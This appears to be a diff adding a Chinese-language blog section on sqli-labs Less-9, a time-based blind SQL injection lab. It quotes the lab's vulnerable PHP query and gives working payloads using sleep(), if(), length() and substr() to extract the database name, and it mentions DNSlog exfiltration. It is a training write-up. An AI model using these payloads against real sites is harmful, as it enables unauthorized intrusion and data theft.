@@ -421,6 +421,46 @@ payload：?id=<span class="number">1</span>%<span class="number">27</span>) <spa
 <p>DNSlog只在windows服务器上有效，如果服务器是Linux就无法使用dnslog来获取数据</p>
 <p>至于为什么要使用四个\，这个是uac规定的，两个\为一个\</p>
 </blockquote>
+<h3 id="Get-Blind-Time-based-Single-quotes-Less-9">Get - Blind - Time based - Single quotes Less-9</h3>
+<p>这个是一个时间型盲注，通过判断是否延时来决定是否存在注入，用到的函数最多最简单的就是sleep()，其实也可以使用慢查询，构造一个需要大量查询时间的查询语句来测试是否存在注入</p>
+<p>首先我们看源码，如下：</p>
+<pre><code class="highlight php"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;
+<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);
+<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);
+
+	<span class="keyword">if</span>(<span class="variable">$row</span>)
+	&#123;
+  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	
+  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;
+  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+    	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;
+  	&#125;
+	<span class="keyword">else</span> 
+	&#123;
+	
+	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;
+	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;
+	<span class="comment">//print_r(mysql_error());</span>
+	<span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span>
+	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;	
+	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	
+	
+	&#125;
+&#125;</code></pre>
+<p>可以看出需要使用<code>'</code>构造，所以payload如下：</p>
+<pre><code class="highlight mysql">?id=1%27 and sleep(5) -- -  #发现网页需要等待将近5秒才会完全显示就说明存在漏洞，也可以看浏览器的耗时，如下图Less-9-1</code></pre>
+<p><img src="https://s1.imagehub.cc/images/2021/10/03/imagedc3de8fd8dc0aef6.png" alt="imagedc3de8fd8dc0aef6.png"></p>
+<center>【Less-9-1】</center>
+<p>至于后面的操作还需要一个if()函数判断</p>
+<blockquote>
+<p>if(x1,x2,x3)：如果x1成立就执行x2，否则执行x3</p>
+</blockquote>
+<p>所以构造的payload为：</p>
+<pre><code class="highlight mysql">?id=1%27 and if(length(database())=8,sleep(5),1) -- - #如果database()长度为8就延时5秒，否则就不延时，当然延时是在符合后才执行或者不符合才执行看个人</code></pre>
+<p>至于后面如何获取数据库名payload如下：</p>
+<pre><code class="highlight mysql">?id=1%27 and if(substr(database(),1,1)=&#x27;s&#x27;,sleep(5),1) -- - #如果数据库第一个字符为s就延时5秒，后续结果和前面的盲注是一致的</code></pre>
+<p>总的来说，盲注的话基本都是需要单个单个的猜解，所以时间盲注和布尔盲注原理都是一样的，后面表名字段名就不累述了，基本都是一样的</p>
+<p>只要是盲注都可以使用DNSlog来解决，但是不能在Linux服务器上使用这个，同时还需要load_file()不被禁止，如果load_file()被 禁止就只能使用基本的方法来解决了，只要掌握了原理，也可以自己写脚本是一样的，但是有sqlmap就省去了很多的麻烦</p>
 
 </div>
 
